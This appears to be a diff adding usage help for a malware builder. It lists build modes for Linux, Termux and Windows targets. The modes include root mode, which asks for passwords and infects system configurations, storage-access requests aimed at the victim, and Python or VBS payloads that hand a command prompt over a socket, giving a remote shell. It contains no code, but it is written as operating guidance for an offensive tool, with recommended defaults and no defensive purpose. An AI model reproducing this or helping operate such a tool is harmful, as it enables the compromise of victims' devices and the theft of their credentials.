@@ -1,0 +1,48 @@
+set a mode before building a malware, like if you need from malware to ask for password or no
+
+for every target there are some modes 
+
+you can use always 'mode auto' this is the recommented & Best modes
+
+usage:
+    
+       for the linux & Boards target:
+           
+              mode root   : Malware will ask for passwords and access read-only directories and infect system configurations (Recommented)
+              mode noroot : Malware will not ask for passwords, and access only current working directory.
+              mode auto   : Malware will use its auto mode, (root)
+
+       for the termux target:
+              
+              mode appshell : Malware will not ask for accessing files on device (/storage) and give you back a shell within app envirenment
+              mode request  : Malware will send request to user asking them for access to the device storage
+              mode auto     : Malware will use its auto mode (Request)
+       for  the windows target:
+              
+              mode python   : python Malware that start a command prompt redirecting stdin and stdout to the socket (Recommented)
+              mode vbs      : Windows VBS Malware that start a command prompt and receive data from socket passing it to command prompt session
+              mode auto     : Malware will use its auto mode (python)
+
+exapmle: 
+     (Linux) & (boards)
+       mode root
+       mode noroot
+       mode auto
+
+     (Termux)
+       mode appshell
+       mode request
+       mode auto
+
+     (windows)
+       mode python
+       mode vbs
+       mode auto
+
+
+
+
+
+
+
+
